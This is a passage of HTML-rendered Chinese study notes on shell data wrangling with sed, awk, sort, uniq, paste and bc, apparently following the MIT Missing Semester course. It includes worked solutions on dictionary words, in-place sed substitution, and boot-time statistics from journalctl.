</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#note-cs-tms-data-wrangling-__codelineno-7-3"></a><span class="p">|</span><span class="w"> </span>uniq<span class="w"> </span>-c
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#note-cs-tms-data-wrangling-__codelineno-7-4"></a><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-nk1,1
</span></code></pre></div>
<code>-k1,1</code> 则表示“仅基于以空格分割的第一列进行排序”。<code>,n</code> 部分表示“仅排序到第 n 个部分”，默认情况是到行尾。</p>
<p>如果我们只想要显示出用户名，那么</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#note-cs-tms-data-wrangling-__codelineno-8-1"></a>sed<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;s/.*Disconnected from (invalid |authenticating )?user (.*) [^ ]+ port [0-9]+( \[preauth\])?$/\2/&#39;</span><span class="w"> </span>ssh.log<span class="w"> </span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#note-cs-tms-data-wrangling-__codelineno-8-2"></a><span class="p">|</span><span class="w"> </span>sort
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#note-cs-tms-data-wrangling-__codelineno-8-3"></a><span class="p">|</span><span class="w"> </span>uniq<span class="w"> </span>-c
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#note-cs-tms-data-wrangling-__codelineno-8-4"></a><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-nk1,1
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#note-cs-tms-data-wrangling-__codelineno-8-5"></a><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span>
</span></code></pre></div>
<h2 id="note-cs-tms-data-wrangling-awk">awk<a class="headerlink" href="#note-cs-tms-data-wrangling-awk" title="Permanent link">&para;</a></h2>
<p>awk 其实是一种编程语言，只不过它碰巧非常善于处理文本。</p>
<p>在上面的例子中</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#note-cs-tms-data-wrangling-__codelineno-9-1"></a>awk<span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span>
</span></code></pre></div>
<p><code>awk</code> 程序接受一个模式串（可选），
以及一个代码块，
指定当模式匹配时应该做何种操作。
默认当模式串即匹配所有行（上面命令中当用法）。 
在代码块中，<code>$0</code> 表示整行的内容，
<code>$1</code> 到 <code>$n</code> 为一行中的 <code>n</code> 个区域，区域的分割基于 awk 的域分隔符（
默认是空格，可以通过 <code>-F</code> 来修改）。
在这个例子中，我们的代码意思是：对于每一行文本，打印其第二个部分，也就是用户名。</p>
<p>最后，我们还可以接上<code>paste</code>来将用户名和用户名出现的次数进行合并。</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#note-cs-tms-data-wrangling-__codelineno-10-1"></a>sed<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;s/.*Disconnected from (invalid |authenticating )?user (.*) [^ ]+ port [0-9]+( \[preauth\])?$/\2/&#39;</span><span class="w"> </span>ssh.log<span class="w"> </span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#note-cs-tms-data-wrangling-__codelineno-10-2"></a><span class="p">|</span><span class="w"> </span>sort
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#note-cs-tms-data-wrangling-__codelineno-10-3"></a><span class="p">|</span><span class="w"> </span>uniq<span class="w"> </span>-c
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#note-cs-tms-data-wrangling-__codelineno-10-4"></a><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-nk1,1
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#note-cs-tms-data-wrangling-__codelineno-10-5"></a><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span>
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#note-cs-tms-data-wrangling-__codelineno-10-6"></a><span class="p">|</span><span class="w"> </span>paste<span class="w"> </span>-sd<span class="w"> </span><span class="s2">&quot;,&quot;</span>
</span></code></pre></div>
即<code>awk</code>提取用户名后，<code>paste</code>将用户名和用户名出现的次数进行合并，分割符为<code>,</code>。</p>
<p>现在，我们统计一下所有以 c 开头，以 e 结尾，并且仅尝试过一次登录的用户。</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#note-cs-tms-data-wrangling-__codelineno-11-1"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;$1 == 1 &amp;&amp; $2 ~ /^c[^ ]*e$/ { print $2 }&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>wc<span class="w"> </span>-l
</span></code></pre></div>
首先，注意这次我们为 awk 
指定了一个匹配模式串（也就是 <code>{...} 前面的那部分内容</code>）。该匹配要求文本的第
一部分需要等于 1（这部分刚好是 <code>uniq -c</code> 得到的计数值），然后其第二部分必须满足给定的一个正则表达式。代码块中的内容则表示打印用
户名。然后我们使用 <code>wc -l</code> 统计输出结果的行数。</p>
<p>在 <code>awk</code> 中，<code>~</code> 运算符用于将字段与正则表达式进行匹配。</p>
<h2 id="note-cs-tms-data-wrangling-bc">bc<a class="headerlink" href="#note-cs-tms-data-wrangling-bc" title="Permanent link">&para;</a></h2>
<p><code>bc</code> 是一个任意精度计算器语言，通常用于进行数学计算。它允许您执行复杂的算术运算，包括浮点运算。</p>
<p>可以将每行的数字加起来：</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#note-cs-tms-data-wrangling-__codelineno-12-1"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>paste<span class="w"> </span>-sd+<span class="w"> </span><span class="p">|</span><span class="w"> </span>bc<span class="w"> </span>-l
</span></code></pre></div>
下面这种更加复杂的表达式也可以：</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#note-cs-tms-data-wrangling-__codelineno-13-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;2*(</span><span class="k">$(</span>data<span class="w"> </span><span class="p">|</span><span class="w"> </span>paste<span class="w"> </span>-sd+<span class="k">)</span><span class="s2">)&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>bc<span class="w"> </span>-l
</span></code></pre></div>
<p>首先<code>$(data | paste -sd+)</code>获取了<code>data | paste -sd+</code>的输出，然后把它放在<code>2*()</code>中。再传递给<code>bc</code>进行计算。<code>-l</code>表示使用<code>bc</code>的数学库。</p>
<p>如果想要绘制图表，可以使用<code>gnuplot</code>。</p>
<p>我们还可以处理二进制数据</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#note-cs-tms-data-wrangling-__codelineno-14-1"></a>ffmpeg<span class="w"> </span>-loglevel<span class="w"> </span>panic<span class="w"> </span>-i<span class="w"> </span>/dev/video0<span class="w"> </span>-frames<span class="w"> </span><span class="m">1</span><span class="w"> </span>-f<span class="w"> </span>image2<span class="w"> </span>-
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#note-cs-tms-data-wrangling-__codelineno-14-2"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>convert<span class="w"> </span>-<span class="w"> </span>-colorspace<span class="w"> </span>gray<span class="w"> </span>-
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#note-cs-tms-data-wrangling-__codelineno-14-3"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>gzip
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#note-cs-tms-data-wrangling-__codelineno-14-4"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>ssh<span class="w"> </span>mymachine<span class="w"> </span><span class="s1">&#39;gzip -d | tee copy.jpg | env DISPLAY=:0 feh -&#39;</span>
</span></code></pre></div>
<ul>
<li><code>ffmpeg</code>：一个强大的多媒体框架，用于录制、转换和流式传输音频和视频。</li>
<li><code>-loglevel panic</code>：设置日志级别为“panic”，这意味着只显示致命错误。</li>
<li><code>-i /dev/video0</code>：指定输入设备，通常是Linux系统上的默认视频捕获设备。</li>
<li><code>-frames 1</code>：只捕获视频输入中的一帧。</li>
<li><code>-f image2 -</code>：指定输出格式为单个图像，并将其输出到标准输出。</li>
<li><code>convert</code>：ImageMagick套件中的一个命令，用于转换和处理图像。</li>
<li><code>-</code>：表示输入来自标准输入。</li>
<li><code>-colorspace gray</code>：将图像转换为灰度色彩空间。</li>
<li><code>-</code>：将处理后的图像输出到标准输出。</li>
<li><code>gzip</code>：用于压缩数据的工具。这里将图像数据进行压缩。</li>
<li><code>ssh mymachine</code>：通过SSH连接到名为<code>mymachine</code>的远程机器。</li>
<li><code>'gzip -d | tee copy.jpg | env DISPLAY=:0 feh -'</code>：在远程机器上执行的命令。</li>
<li><code>gzip -d</code>：解压缩数据。</li>
<li><code>tee copy.jpg</code>：将解压缩后的图像保存为<code>copy.jpg</code>，同时将其传递到下一个命令。</li>
<li><code>env DISPLAY=:0 feh -</code>：使用<code>feh</code>在远程机器的显示器上显示图像，<code>DISPLAY=:0</code>指定显示器。</li>
</ul>
<p>这段代码的整体功能是从本地视频设备捕获一帧图像，转换为灰度，压缩后通过SSH传输到远程机器，并在远程机器上显示该图像。</p>
<h2 id="note-cs-tms-data-wrangling-exercise-solutions">Exercise &amp; Solutions<a class="headerlink" href="#note-cs-tms-data-wrangling-exercise-solutions" title="Permanent link">&para;</a></h2>
<p>1.Take <a href="https://regexone.com/">this short interactive regex tutorial</a></p>
<p>这个没什么好说的，玩一玩,一共十五节入门练习，练习之前会给你介绍一下正则表达式的基本知识</p>
<figure>
<img alt="" src="../NOTE/CS/TMS/img/lec3.png" width="65%" />

<figcaption>Passed</figcaption>
</figure>
<p>2.Find the number of words (in <code>/usr/share/dict/words</code>) that contain at least three <code>a</code>s and don’t have a <code>'s</code> ending. What are the three most common last two letters of those words? <code>sed</code>’s <code>y</code> command, or the <code>tr</code> program, may help you with case insensitivity. How many of those two-letter combinations are there? And for a challenge: which combinations do not occur?</p>
<p>即要求</p>
<ul>
<li>包含至少三个<code>a</code></li>
<li>不以<code>'s</code>结尾</li>
<li>使用<code>sed</code>的<code>y</code>命令或<code>tr</code>程序实现大小写不敏感</li>
<li>找出最常见的三个最后两个字母组合</li>
<li>找出总共有多少种这样的两个字母组合</li>
<li>找出哪些组合没有出现</li>
</ul>
<p>首先看看<code>sed</code>的<code>y</code>命令</p>
<p>首先找到包含至少三个<code>a</code>的单词</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#note-cs-tms-data-wrangling-__codelineno-15-1"></a>cat<span class="w"> </span>/usr/share/dict/words<span class="w"> </span>
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#note-cs-tms-data-wrangling-__codelineno-15-2"></a><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span><span class="s1">&#39;y/ABCDEFGHIJKLMNOPQRSTUVWXYZ/abcdefghijklmnopqrstuvwxyz/&#39;</span>
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#note-cs-tms-data-wrangling-__codelineno-15-3"></a><span class="p">|</span>grep<span class="w"> </span>-E<span class="w">  </span><span class="s2">&quot;^([^a]*a){3}.*</span>$<span class="s2">&quot;</span>
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#note-cs-tms-data-wrangling-__codelineno-15-4"></a><span class="p">|</span>grep<span class="w"> </span>-vE<span class="w"> </span><span class="s2">&quot;&#39;s</span>$<span class="s2">&quot;</span>
</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#note-cs-tms-data-wrangling-__codelineno-15-5"></a><span class="p">|</span><span class="w"> </span>wc<span class="w"> </span>-l
</span></code></pre></div>
<p>然后统计这些单词的最后两个字母组合,找出最常见的三种</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#note-cs-tms-data-wrangling-__codelineno-16-1"></a>cat<span class="w"> </span>/usr/share/dict/words<span class="w"> </span>
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#note-cs-tms-data-wrangling-__codelineno-16-2"></a><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span><span class="s1">&#39;y/ABCDEFGHIJKLMNOPQRSTUVWXYZ/abcdefghijklmnopqrstuvwxyz/&#39;</span>
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#note-cs-tms-data-wrangling-__codelineno-16-3"></a><span class="p">|</span>grep<span class="w"> </span>-E<span class="w">  </span><span class="s2">&quot;^([^a]*a){3}.*</span>$<span class="s2">&quot;</span>
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#note-cs-tms-data-wrangling-__codelineno-16-4"></a><span class="p">|</span>grep<span class="w"> </span>-vE<span class="w"> </span><span class="s2">&quot;&#39;s</span>$<span class="s2">&quot;</span>
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#note-cs-tms-data-wrangling-__codelineno-16-5"></a><span class="p">|</span>sed<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;s/.*([a-z]{2})</span>$<span class="s2">/\1/&quot;</span>
</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#note-cs-tms-data-wrangling-__codelineno-16-6"></a><span class="p">|</span>sort
</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#note-cs-tms-data-wrangling-__codelineno-16-7"></a><span class="p">|</span>uniq<span class="w"> </span>-c
</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#note-cs-tms-data-wrangling-__codelineno-16-8"></a><span class="p">|</span>sort<span class="w"> </span>-nk1,1
</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#note-cs-tms-data-wrangling-__codelineno-16-9"></a><span class="p">|</span>head<span class="w"> </span>-3
</span></code></pre></div>
<p>3.To do in-place substitution it is quite tempting to do something like <code>sed s/REGEX/SUBSTITUTION/ input.txt &gt; input.txt</code>. However this is a bad idea, why? Is this particular to sed? Use man sed to find out how to accomplish this.</p>
<p><code>sed s/REGEX/SUBSTITUTION/ input.txt &gt; input.txt</code> 表达式中后一个 <code>input.txt</code> 会首先被清空，而且是发生在前的。所以前面一个 <code>input.txt</code> 在还没有被 <code>sed</code> 处理时已经为空了。在使用正则处理文件前最好是首先备份文件。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#note-cs-tms-data-wrangling-__codelineno-17-1"></a>sed<span class="w"> </span>-i.bak<span class="w"> </span><span class="s1">&#39;s/REGEX/SUBSTITUTION/&#39;</span><span class="w"> </span>input.txt
</span></code></pre></div>
<p>4.Find your average, median, and max system boot time over the last ten boots. Use journalctl on Linux and log show on macOS, and look for log timestamps near the beginning and end of each boot. On Linux, they may look something like:
<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#note-cs-tms-data-wrangling-__codelineno-18-1"></a>Logs begin at ...
</span></code></pre></div>
and
<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#note-cs-tms-data-wrangling-__codelineno-19-1"></a>systemd[577]: Startup finished in ...
</span></code></pre></div>
On macOS, look for:</p>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#note-cs-tms-data-wrangling-__codelineno-20-1"></a>=== system boot:
</span></code></pre></div>
and
<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#note-cs-tms-data-wrangling-__codelineno-21-1"></a>Previous shutdown cause: 5
</span></code></pre></div></p>
<p>编写脚本获取最近启动时间</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#note-cs-tms-data-wrangling-__codelineno-22-1"></a><span class="ch">#!/bin/bash</span>
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#note-cs-tms-data-wrangling-__codelineno-22-2"></a><span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">{</span><span class="m">1</span>..10<span class="o">}</span>
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#note-cs-tms-data-wrangling-__codelineno-22-3"></a><span class="k">do</span>
</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#note-cs-tms-data-wrangling-__codelineno-22-4"></a><span class="w">    </span>journalctl<span class="w"> </span>-b-<span class="nv">$i</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;Startup finished in&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;systemd\[1\]&quot;</span>&gt;&gt;<span class="w"> </span>boot_time.txt
</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#note-cs-tms-data-wrangling-__codelineno-22-5"></a><span class="k">done</span>
</span></code></pre></div>
然后会得到</p>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#note-cs-tms-data-wrangling-__codelineno-23-1"></a>Feb 05 20:21:43 Kailqq systemd[1]: Startup finished in 1.359s.
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#note-cs-tms-data-wrangling-__codelineno-23-2"></a>Feb 05 16:30:06 Kailqq systemd[1]: Startup finished in 1.342s.
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#note-cs-tms-data-wrangling-__codelineno-23-3"></a>Feb 05 16:44:03 Kailqq systemd[1]: Startup finished in 1.294s.
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#note-cs-tms-data-wrangling-__codelineno-23-4"></a>Feb 05 11:13:19 Kailqq systemd[1]: Startup finished in 1.404s.
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#note-cs-tms-data-wrangling-__codelineno-23-5"></a>Feb 04 15:57:46 Kailqq systemd[1]: Startup finished in 1.409s.
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#note-cs-tms-data-wrangling-__codelineno-23-6"></a>Feb 04 10:45:36 Kailqq systemd[1]: Startup finished in 1.419s.
</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#note-cs-tms-data-wrangling-__codelineno-23-7"></a>Feb 03 23:31:58 Kailqq systemd[1]: Startup finished in 1.359s.
</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#note-cs-tms-data-wrangling-__codelineno-23-8"></a>Feb 03 19:40:25 Kailqq systemd[1]: Startup finished in 1.372s.
</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#note-cs-tms-data-wrangling-__codelineno-23-9"></a>Jan 30 09:36:06 Kailqq systemd[1]: Startup finished in 1.334s.
</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#note-cs-tms-data-wrangling-__codelineno-23-10"></a>Jan 27 11:09:24 Kailqq systemd[1]: Startup finished in 3.232s.
</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#note-cs-tms-data-wrangling-__codelineno-23-11"></a>Jan 26 21:52:40 Kailqq systemd[1]: Startup finished in 1.333s.
</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#note-cs-tms-data-wrangling-__codelineno-23-12"></a>Jan 26 23:11:53 Kailqq systemd[1]: Startup finished in 1.476s.
</span></code></pre></div>
这样只要把最后的时间提取出来就行</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#note-cs-tms-data-wrangling-__codelineno-24-1"></a><span class="w"> </span>cat<span class="w"> </span>boot_time.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;s/^.*([0-9]+\.[0-9]+)s\.$/\1/&#39;</span><span class="w"> </span>
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#note-cs-tms-data-wrangling-__codelineno-24-2"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>paste<span class="w"> </span>-sd<span class="s1">&#39;\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>timelist.txt
</span></code></pre></div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>呃啊，本来用的是<code>\d+\.\d+</code>来替代<code>[0-9]+\.[0-9]</code>, 结果<code>sed</code>好像不支持导致搞了好久</p>
</div>
<p>这样就得到了时间列表    </p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#note-cs-tms-data-wrangling-__codelineno-25-1"></a>cat<span class="w"> </span>timelist.txt
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#note-cs-tms-data-wrangling-__codelineno-25-2"></a><span class="m">1</span>.359
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#note-cs-tms-data-wrangling-__codelineno-25-3"></a><span class="m">1</span>.342
</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#note-cs-tms-data-wrangling-__codelineno-25-4"></a><span class="m">1</span>.294
</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#note-cs-tms-data-wrangling-__codelineno-25-5"></a><span class="m">1</span>.404
</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#note-cs-tms-data-wrangling-__codelineno-25-6"></a><span class="m">1</span>.409
</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#note-cs-tms-data-wrangling-__codelineno-25-7"></a><span class="m">1</span>.419
</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#note-cs-tms-data-wrangling-__codelineno-25-8"></a><span class="m">1</span>.359
</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#note-cs-tms-data-wrangling-__codelineno-25-9"></a><span class="m">1</span>.372
</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#note-cs-tms-data-wrangling-__codelineno-25-10"></a><span class="m">1</span>.334
</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#note-cs-tms-data-wrangling-__codelineno-25-11"></a><span class="m">3</span>.232
</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#note-cs-tms-data-wrangling-__codelineno-25-12"></a><span class="m">1</span>.333
</span><span id="__span-25-13"><a id="__codelineno-25-13" name="__codelineno-25-13" href="#note-cs-tms-data-wrangling-__codelineno-25-13"></a><span class="m">1</span>.476
</span></code></pre></div>
<p>计算平均值</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#note-cs-tms-data-wrangling-__codelineno-26-1"></a><span class="nv">amount</span><span class="o">=</span><span class="k">$(</span>cat<span class="w"> </span>timelist.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>wc<span class="w"> </span>-l<span class="k">)</span>
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#note-cs-tms-data-wrangling-__codelineno-26-2"></a><span class="nv">sum</span><span class="o">=</span><span class="k">$(</span>cat<span class="w"> </span>timelist.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>paste<span class="w"> </span>-sd+<span class="w"> </span><span class="p">|</span><span class="w"> </span>bc<span class="w"> </span>-l<span class="k">)</span>
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#note-cs-tms-data-wrangling-__codelineno-26-3"></a><span class="nv">mean</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;scale=2; </span><span class="nv">$sum</span><span class="s2"> / </span><span class="nv">$amount</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>bc<span class="w"> </span>-l<span class="k">)</span>
</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#note-cs-tms-data-wrangling-__codelineno-26-4"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;平均值: </span><span class="nv">$mean</span><span class="s2">&quot;</span>
</span></code></pre></div>
<p>计算中位数</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#note-cs-tms-data-wrangling-__codelineno-27-1"></a>cat<span class="w"> </span>timelist.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-n<span class="w"> </span><span class="p">|</span><span class="w"> </span>paste<span class="w"> </span>-sd<span class="se">\ </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{</span>
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#note-cs-tms-data-wrangling-__codelineno-27-2"></a><span class="s1">    split($0, a, &quot; &quot;)</span>
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#note-cs-tms-data-wrangling-__codelineno-27-3"></a><span class="s1">    n = length(a)</span>
</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#note-cs-tms-data-wrangling-__codelineno-27-4"></a><span class="s1">    if (n % 2 == 1) {</span>
</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#note-cs-tms-data-wrangling-__codelineno-27-5"></a><span class="s1">        median = a[(n + 1) / 2]</span>
</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#note-cs-tms-data-wrangling-__codelineno-27-6"></a><span class="s1">    } else {</span>
</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#note-cs-tms-data-wrangling-__codelineno-27-7"></a><span class="s1">        median = (a[n / 2] + a[(n / 2) + 1]) / 2</span>
</span><span id="__span-27-8"><a id="__codelineno-27-8" name="__codelineno-27-8" href="#note-cs-tms-data-wrangling-__codelineno-27-8"></a><span class="s1">    }</span>
</span><span id="__span-27-9"><a id="__codelineno-27-9" name="__codelineno-27-9" href="#note-cs-tms-data-wrangling-__codelineno-27-9"></a><span class="s1">    print median</span>
</span><span id="__span-27-10"><a id="__codelineno-27-10" name="__codelineno-27-10" href="#note-cs-tms-data-wrangling-__codelineno-27-10"></a><span class="s1">}&#39;</span>
</span></code></pre></div>
<p>可能需要解释一下这段awk代码：
<code>split($0, a, " ")</code> 将输入的每一行按空格分割成一个数组a
<code>n = length(a)</code> 获取数组a的长度
<code>if (n % 2 == 1)</code> 如果数组a的长度为奇数，则中位数为数组a的中间一个元素
<code>median = a[(n + 1) / 2]</code> 如果数组a的长度为奇数，则中位数为数组a的中间一个元素
<code>median = (a[n / 2] + a[(n / 2) + 1]) / 2</code> 如果数组a的长度为偶数，则中位数为数组a的中间两个元素的平均值
<code>print median</code> 打印中位数</p>
<p>计算最大值</p>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#note-cs-tms-data-wrangling-__codelineno-28-1"></a>cat<span class="w"> </span>timelist.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-n<span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-1
</span></code></pre></div>
计算最小值</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#note-cs-tms-data-wrangling-__codelineno-29-1"></a>cat<span class="w"> </span>timelist.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-n<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-1
</span></code></pre></div>
<p>累了，后面的两题不想做了<img alt="😭" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/1f62d.svg" title=":sob:" /></p></section><section class="print-page" id="note-cs-tms-command-line-environment" heading-number="2.4.2.5"><h1 id="note-cs-tms-command-line-environment-command-line-environment">Command line environment<a class="headerlink" href="#note-cs-tms-command-line-environment-command-line-environment" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
